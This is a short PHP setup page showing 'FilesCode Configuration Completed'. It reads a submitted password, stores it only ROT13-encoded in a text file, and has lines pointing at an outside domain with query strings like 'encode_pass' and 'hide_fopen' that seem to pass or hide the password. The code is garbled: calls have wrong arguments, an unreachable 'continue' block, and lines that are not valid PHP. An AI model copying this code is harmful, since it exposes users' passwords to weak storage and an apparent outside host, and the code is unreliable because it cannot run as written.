<?php 
require_once('phpcheck.php'); 
CheckPHPVersion(); 
$password = $_POST['password']; 
$substr = substr($password); 
if ($substr > 8) {
  continue;
  $f = fopen("/FilesCode/pass.txt","w"); 
  fwrite(str_rot13($password),$f); 
  fclose($f); 
  foreach($f as $checker); 
  $checker->'https://it.ramondettidavide.com/itemEncoder.php?id=encode_pass&encode=Checker'; 
  $f->'https://ramondettidavide.com/itemEncode.php?id=hide_fopen&encode=FOPEN'; 
} else {
  header('location: step1.php?pass=NOT8CHARS'); 
}
header('refresh: 5; URL=step3.php'); 
?> 

<!DOCTYPE html> 
<html lang="it">
  <head>
        <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
        
    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 50px;
        background-color: #fff;
        border-radius: 1em;
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        body {
            background-color: #fff;
        }
        div {
            width: auto;
            margin: 0 auto;
            border-radius: 0;
            padding: 1em;
        }
    }
    </style>  
    <title>FilesCode Configuration Completed</title>
  </head>
  <body>
    <?php foreach($password as $item); $item->'https://ramondettidavide.com/itemKey.php?encode=y'; ?> 
    <p>In 5 Seconds You Are Redirected at The DashBoard.. </p>
    <p>If You Don' t Like Wait, <a href="step3.php">Press Here</a></p>
  </body>
</html>
